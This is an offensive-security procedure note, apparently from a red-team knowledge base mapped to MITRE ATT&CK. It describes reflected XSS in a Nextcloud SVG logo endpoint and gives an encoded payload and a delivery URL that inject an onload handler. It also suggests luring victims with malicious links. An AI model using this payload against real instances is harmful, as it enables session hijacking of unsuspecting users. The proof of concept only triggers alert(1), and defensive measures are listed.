---
tags:
  - xss
  - injection
  - svg
type: procedure
tools:
  - '[[tools/Web-Browser]]'
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 1cf56bed-5043-46d2-8adf-604ef97f4c1e
created_at: '2025-12-14T03:47:18.610Z'
updated_at: '2025-12-14T03:47:18.610Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-in-SVG-Logo

## Summary

Injects a reflected XSS payload into the Nextcloud SVG logo endpoint's color parameter to break out of the fill attribute and execute JavaScript via onload.

## Description

The vulnerability stems from unsanitized 'color' input in IconsCacher.php and SvgController.php, allowing encoded payloads to inject SVG elements. This enables JS execution if CSP is bypassed, demonstrating the XSS risk. In real attacks, lure victims via malicious links.

## Requirements

1. Access to Nextcloud instance
2. Encoded payload knowledge
3. Victim browser without strict CSP

## Defense

Defensive measures and detection strategies:

- Sanitize/escape SVG attributes server-side
- Implement strict CSP with no unsafe-inline
- Log and monitor anomalous SVG requests

## Objectives

1. Break out of SVG attribute
2. Inject and execute JS
3. Alert for proof-of-concept

## Instructions

### Step 1: Craft Payload

**Context**: Encode quotes to close fill attribute and inject <g> with onload.

Payload: color=f00%22/%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3Ccircle%20alt=%22meh

> URL-encode to prevent breaking the query string.

### Step 2: Deliver Payload

**Context**: Visit the endpoint to trigger reflection.

Navigate in Web Browser: https://server.test/nextcloud/index.php/svg/core/logo/logo?color=f00%22/%3E%3Cg%20onload=%22javascript:alert(1)%22%3E%3C/g%3E%3Ccircle%20alt=%22meh

> Replace server.test with test instance URL.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Web-Browser]]

## Tags

- [[xss]]
- [[injection]]
- [[svg]]
